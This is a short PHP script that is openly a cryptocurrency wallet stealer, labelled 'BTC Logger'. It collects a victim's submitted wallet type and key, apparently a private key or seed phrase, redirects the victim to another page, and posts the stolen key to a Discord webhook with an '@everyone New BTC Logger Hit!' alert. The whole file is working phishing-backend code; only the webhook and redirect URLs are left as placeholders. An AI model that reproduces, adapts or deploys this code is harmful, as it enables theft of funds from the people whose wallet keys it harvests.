<?php
    header("Access-Control-Allow-Origin: *");
    
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
$key = $_POST['key']; 
$wallet = $_POST['wallet'];
}

 header("location: https://domain.com/foldername/");

            $hookObject = json_encode([
            "username" => "BTC Logger",
            "avatar_url" => "",
             "content" => "@everyone New BTC Logger Hit!",
                "embeds" => [
                    [
                        "title" => "BTC Logger",
                        "type" => "rich",
                        "url" => "",
                        "color" => hexdec("00ff6e"),
                        "thumbnail" => [
                            "url" => ""
                        ],
                        "author" => [
                             "name" => "",
                             "url" => ""
                        ],
                        "fields" => [
                            [
                                "name" => "Wallet Used",
                                "value" => $wallet,
                                "inline" => True
                            ]
                        ]
                    ],
                    [
                        "type" => "rich",
                        "color" => hexdec("00ff6e"),
                        "timestamp" => date("c"),
                         "footer" => [
                             "text" => "Powered By Velviqs#0001 |",
                        ],
                        "fields" => [
                            [
                                "name" => "Key :",
                            "value" => "```" . $key . "```"
                            ],
                        ]
                    ]
                ]
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
        
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "webhook url",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]); 
        $response = curl_exec($ch);
        curl_close($ch);
    ?>